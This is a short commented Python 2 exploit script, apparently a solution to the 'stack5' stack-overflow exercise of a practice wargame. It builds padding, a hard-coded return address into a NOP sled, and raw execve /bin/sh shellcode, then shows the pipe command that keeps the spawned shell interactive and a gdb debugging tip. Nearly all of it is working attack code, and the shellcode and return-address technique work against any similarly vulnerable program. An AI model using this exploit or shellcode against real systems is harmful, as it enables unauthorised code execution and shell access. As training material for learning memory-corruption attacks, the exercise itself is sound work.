import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" # overflow at TTTT

# the 53 is a magic number to make the instruction pointer hit our nopsled
eip = struct.pack("I", 0xbffff7c0+53) # this address points right after our overflow
                                # since we dont have any win() we are jumping to a part
                                # of the stack we already control. here we can place
                                # shellcode for something like /bin/sh

nopsled = "\x90"*100 # stack isnt aligned so add a nopsled

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print padding+eip+nopsled+shellcode

# (python /tmp/exploit.py ; cat) | ./stack5
# lots of output redirection which makes the pipe get closed. sending the output to cat and then piping
# it to the program lets us enter input

# another useful trick is using hooks in gdb
# example: (gdb) define hook-stop
#          > x/li $eip    show the last instruction
#          > x/8wx $esp   show 8 words in hex from stack
#          > end
